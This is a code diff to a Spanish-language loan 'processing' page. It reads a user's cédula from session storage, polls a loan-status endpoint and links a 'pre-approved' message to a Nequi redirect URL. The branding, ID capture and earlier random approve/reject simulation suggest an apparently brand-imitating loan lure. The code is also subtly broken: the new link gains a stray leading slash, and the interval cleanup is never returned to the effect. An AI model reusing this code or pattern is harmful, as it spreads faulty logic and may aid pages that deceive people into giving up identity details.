@@ -15,19 +15,33 @@ export default function ProcesandoPage() {
 
  useEffect(() => {
    const checkStatus = async () => {
-     const cedula = sessionStorage.getItem('cedula')
-     // Simular el proceso de verificación
-     setTimeout(() => {
-       setShowTransition(true)
-       setTimeout(() => {
-         setStatus(Math.random() > 0.5 ? 'approved' : 'rejected')
-         setShowTransition(false)
-       }, 2000)
-     }, 5000)
-   }
- 
-   checkStatus()
- }, [])
+     const cedula = sessionStorage.getItem('cedula');
+     if (!cedula) {
+       router.push('/');
+       return;
+     }
+
+     // Poll for status every 2 seconds
+     const interval = setInterval(async () => {
+       const response = await fetch(`/api/loan-status?cedula=${cedula}`);
+       const data = await response.json();
+       
+       if (data.status !== 'processing') {
+         clearInterval(interval);
+         setShowTransition(true);
+         setTimeout(() => {
+           setStatus(data.status);
+           setShowTransition(false);
+         }, 2000);
+       }
+     }, 2000);
+
+     // Cleanup interval on component unmount
+     return () => clearInterval(interval);
+   };
+
+   checkStatus();
+ }, [router])
 
   return (
     <main className="min-h-screen bg-pink-50 relative">
@@ -118,7 +132,7 @@ export default function ProcesandoPage() {
                     Tu crédito ha sido pre-aprobado. En breve recibirás un mensaje con los siguientes pasos.
                   </p>
                   <a
-                    href="http://redirect.nequi.co/propeller?_ga=2.183392037.223030828.1738021257-931538480.1737406899"
+                    href="/http://redirect.nequi.co/propeller?_ga=2.183392037.223030828.1738021257-931538480.1737406899"
                     className="block bg-[#E6007E] hover:bg-[#C4006B] text-white px-8 py-2 rounded-xl"
                   >
                     Continuar
